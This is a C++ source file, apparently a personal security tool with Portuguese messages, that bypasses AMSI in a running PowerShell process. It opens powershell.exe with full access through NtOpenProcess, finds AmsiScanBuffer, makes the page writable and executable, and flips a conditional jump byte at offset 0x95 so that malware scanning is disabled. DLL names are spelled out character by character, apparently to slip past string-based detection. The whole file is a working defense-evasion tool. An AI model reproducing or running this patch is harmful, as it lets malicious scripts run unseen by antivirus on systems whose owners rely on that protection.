#include <Windows.h>
#include <TlHelp32.h>
#include <winternl.h>
#include <iostream>

// link: https://learn.microsoft.com/en-us/windows/console/console-screen-buffers#character-attributes
void SetConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

typedef NTSTATUS(WINAPI* nt_write_virtual_memory_t)(
    HANDLE process_handle,
    PVOID base_address,
    PVOID buffer,
    ULONG number_of_bytes,
    PULONG number_of_bytes_written);

typedef NTSTATUS(WINAPI* nt_open_process_t)(
    PHANDLE process_handle,
    ACCESS_MASK desired_access,
    POBJECT_ATTRIBUTES object_attributes,
    CLIENT_ID* client_id);

DWORD obter_id_processo_por_nome(const wchar_t* nome_processo) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W entrada_processo;
        entrada_processo.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &entrada_processo)) {
            do {
                if (wcscmp(entrada_processo.szExeFile, nome_processo) == 0) {
                    CloseHandle(snapshot);
                    return entrada_processo.th32ProcessID;
                }
            } while (Process32NextW(snapshot, &entrada_processo));
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    std::cout << "------------------------------------------------------------------------- \n" << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    printf(
        "~~~~~~~~~~~~~~~~~~~~~~ +-+-+-+-+-+-+-+-+-+-+-+-+-+ ~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~ ||| /////////////////// ||| ~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~ ||| -> Patch amsi.dll   ||| ~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~ ||| -> By Vithor176 ^-^ ||| ~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~ ||| /////////////////// ||| ~~~~~~~~~~~~~~~~~~~~~~\n"
        "~~~~~~~~~~~~~~~~~~~~~~ +-+-+-+-+-+-+-+-+-+-+-+-+-+ ~~~~~~~~~~~~~~~~~~~~~~\n\n"
    );

    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "------------------------------------------------------------------------- \n" << std::endl;

    const wchar_t* nome_processo = L"powershell.exe";
    DWORD id_processo = obter_id_processo_por_nome(nome_processo);

    if (id_processo == 0) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::wcout << L"Processo " << nome_processo << L" nao encontrado." << std::endl;
        return 1;
    }

    const wchar_t n_dll_name[] = { 'n','t','d','l','l','.','d','l','l',0 };
    HMODULE h_ntdll = GetModuleHandleW(n_dll_name);
    if (!h_ntdll) {
        std::cout << "Falha ao carregar ntdll.dll." << std::endl;
        return 1;
    }

    auto nt_write_virtual_memory = (nt_write_virtual_memory_t)GetProcAddress(h_ntdll, "NtWriteVirtualMemory");
    auto nt_open_process = (nt_open_process_t)GetProcAddress(h_ntdll, "NtOpenProcess");

    if (!nt_write_virtual_memory || !nt_open_process) {
        std::cout << "Falha ao obter ponteiros para as funcoes NT." << std::endl;
        return 1;
    }

    CLIENT_ID client_id = { reinterpret_cast<HANDLE>(static_cast<uintptr_t>(id_processo)), nullptr };

    OBJECT_ATTRIBUTES obj_attributes;
    InitializeObjectAttributes(&obj_attributes, NULL, 0, NULL, NULL);

    HANDLE h_processo;
    NTSTATUS status = nt_open_process(&h_processo, PROCESS_ALL_ACCESS, &obj_attributes, &client_id);
    if (status != 0) {
        std::cout << "Falha ao abrir o processo. Codigo de erro: " << std::hex << status << std::endl;
        CloseHandle(h_processo);
        return 1;
    }

    const wchar_t am_dll[] = { 'a','m','s','i','.','d','l','l',0 };
    HMODULE h_amsi = LoadLibraryW(am_dll);
    if (h_amsi == NULL) {
        std::cout << "Falha ao carregar a biblioteca amsi.dll." << std::endl;
        CloseHandle(h_processo);
        return 1;
    }

    FARPROC amsi_scan_buffer = GetProcAddress(h_amsi, "AmsiScanBuffer");
    if (amsi_scan_buffer == NULL) {
        std::cout << "Falha ao localizar AmsiScanBuffer." << std::endl;
        FreeLibrary(h_amsi);
        CloseHandle(h_processo);
        return 1;
    }

    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "Endereco de AmsiScanBuffer: ";
    SetConsoleTextAttribute(hConsole, 7);
    std::cout << amsi_scan_buffer << std::endl;
    SetConsoleTextAttribute(hConsole, 7);
    BYTE* endereco_patch = (BYTE*)amsi_scan_buffer + 0x95;
    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "Endereco de AmsiScanBuffer ";
    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "+ 0x95 = " << static_cast<void*>(endereco_patch) << std::endl;
    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "Endereco do patch: ";
    SetConsoleTextAttribute(hConsole, 7);
    std::cout << static_cast<void*>(endereco_patch) << std::endl;

    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "\n-------------------------------------------------------------------------" << std::endl;

    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQueryEx(h_processo, endereco_patch, &mbi, sizeof(mbi))) {
        SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "\nPermissao atual de memoria do patch: ";
        SetConsoleTextAttribute(hConsole, 7);
        std::cout << mbi.Protect;
        BYTE current_byte;
        SIZE_T bytes_read;
        if (ReadProcessMemory(h_processo, endereco_patch, &current_byte, sizeof(current_byte), &bytes_read)) {
            SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
            std::cout << "\nValor atual no patch: ";
            SetConsoleTextAttribute(hConsole, 7);
            std::cout << "0x" << std::hex << static_cast<int>(current_byte) << std::endl;
        }
        else {
            SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
            std::cout << "\nFalha ao ler o valor atual do patch. Codigo de erro: " << GetLastError() << std::endl;
        }
    }

    DWORD old_protect;
    ULONG tamanho_regiao = 0x1000;

    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "\n-------------------------------------------------------------------------" << std::endl;

    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "Alterando a protecao de memoria do patch com ";
    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "VirtualProtectEx!" << std::endl;
    if (!VirtualProtectEx(h_processo, endereco_patch, tamanho_regiao, PAGE_EXECUTE_READWRITE, &old_protect)) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "\nFalha ao alterar permissoes de memoria. Codigo de erro: " << GetLastError() << std::endl;
        CloseHandle(h_processo);
        FreeLibrary(h_amsi);
        return 1;
    }

    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "\nPermissao de memoria do patch alterado para: ";
    SetConsoleTextAttribute(hConsole, 7);
    std::cout << std::hex << old_protect << std::endl;

    // Patch - troca o byte de 0x74 para 0x75 (JZ para JNZ)
    BYTE patch = 0x75;
    SIZE_T bytes_escritos;
    status = nt_write_virtual_memory(h_processo, endereco_patch, &patch, sizeof(patch), (PULONG)&bytes_escritos);
    BYTE current_byte;
    SIZE_T bytes_read;
    if (ReadProcessMemory(h_processo, endereco_patch, &current_byte, sizeof(current_byte), &bytes_read)) {
        SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "\nValor atual no patch apos a alteracao com ";
        SetConsoleTextAttribute(hConsole, 7);
        std::cout << "NtWriteVirtualMemory: ";
        std::cout << "0x" << std::hex << static_cast<int>(current_byte) << std::endl;
    }
    else {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "\nFalha ao ler o valor atual do patch. Codigo de erro: " << GetLastError() << std::endl;
    }

    if (status != 0 || bytes_escritos != sizeof(patch)) {
        std::cout << "\nFalha ao escrever na memoria. Codigo de erro: " << std::hex << status << std::endl;
        VirtualProtectEx(h_processo, endereco_patch, tamanho_regiao, old_protect, &old_protect);
        FreeLibrary(h_amsi);
        CloseHandle(h_processo);
        return 1;
    }

    if (!VirtualProtectEx(h_processo, endereco_patch, tamanho_regiao, old_protect, &old_protect)) {
        std::cout << "\nFalha ao restaurar permissões de memória. Codigo de erro: " << GetLastError() << std::endl;
    }
    else {
        SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "\nPermissao de memoria do patch restaurada com sucesso." << std::endl;
    }

    FreeLibrary(h_amsi);
    CloseHandle(h_processo);

    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "-------------------------------------------------------------------------" << std::endl;

    SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
    std::cout << "Patch aplicado com sucesso! :P" << std::endl;
    SetConsoleTextAttribute(hConsole, 7);
    std::cout << "-------------------------------------------------------------------------" << std::endl;
    return 0;
}